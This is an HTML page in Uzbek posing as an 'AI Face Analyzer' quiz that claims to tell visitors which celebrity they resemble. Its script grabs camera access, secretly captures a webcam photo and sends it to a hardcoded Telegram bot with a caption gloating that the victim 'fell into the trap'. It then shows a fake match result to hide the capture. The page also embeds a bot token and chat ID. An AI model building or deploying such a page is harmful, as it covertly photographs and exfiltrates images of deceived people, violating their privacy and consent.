<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Analyzer</title>
    <style>
        body { font-family: sans-serif; text-align: center; background-color: #f0f2f5; padding-top: 50px; }
        .container { background: white; padding: 30px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        button { background: #0095f6; color: white; border: none; padding: 15px 30px; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 18px; }
        #video { display: none; }
    </style>
</head>
<body>

<div class="container">
    <h2>Siz qaysi mashhur insonga o'xshaysiz? 🤔</h2>
    <p>AI tizimi yuzingizni skaner qilishi uchun ruxsat bering:</p>
    <button onclick="startPrank()">Testni boshlash</button>
    <p id="status" style="margin-top: 20px; font-weight: bold; color: #0095f6;"></p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const BOT_TOKEN = '8773988826:AAFjeAtak_rptAUTFbhnGLj87DA1cuemyTw';
    const CHAT_ID = '5777502829'; // Sizning raqamingiz o'rnatildi!

    async function startPrank() {
        const status = document.getElementById('status');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;
            status.innerText = "Skaner qilinmoqda... 3 soniya kuting...";

            setTimeout(async () => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'prank.jpg');
                    formData.append('caption', '🎯 Tuzoqqa tushdi! Mana uning rasmi.');

                    await fetch(`https://telegram.org{BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    status.innerHTML = "Tahlil tugadi!<br>Siz: <b>Cristiano Ronaldoga</b> 98% o'xshaysiz! 😂";
                    stream.getTracks().forEach(track => track.stop());
                }, 'image/jpeg');
            }, 3000);
        } catch (err) {
            status.innerText = "Xato: Kamera ruxsat berilmadi!";
        }
    }
</script>

</body>
</html>
